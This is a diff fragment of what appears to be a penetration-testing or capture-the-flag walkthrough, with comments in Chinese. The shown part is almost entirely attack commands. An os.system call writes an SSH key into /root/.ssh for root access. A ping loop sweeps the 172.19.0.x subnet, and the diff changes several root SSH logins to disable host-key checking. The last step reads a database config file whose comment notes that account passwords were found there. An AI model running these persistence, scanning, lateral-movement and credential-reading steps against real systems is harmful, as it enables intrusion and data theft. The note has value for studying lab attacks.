@@ -15,11 +15,11 @@ os.system("mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAxzYI
 # 扫描172.19.0.*网段
 # 设置1s超时
 for k in $( seq 1 255);do ping -c 1 -W 1 172.19.0."$k"|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
-ssh root@172.19.0.2
-ssh root@172.19.0.3
-ssh root@172.19.0.4
-ssh root@172.19.0.5
-ssh root@172.19.0.6 # 连接结点2
+ssh root@172.19.0.2 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+ssh root@172.19.0.3 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+ssh root@172.19.0.4 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+ssh root@172.19.0.5 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+ssh root@172.19.0.6 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no # 连接结点2
 # 结点2，provdb
 # 发现了数据库账号密码
 cat /app/src/user/db.conf
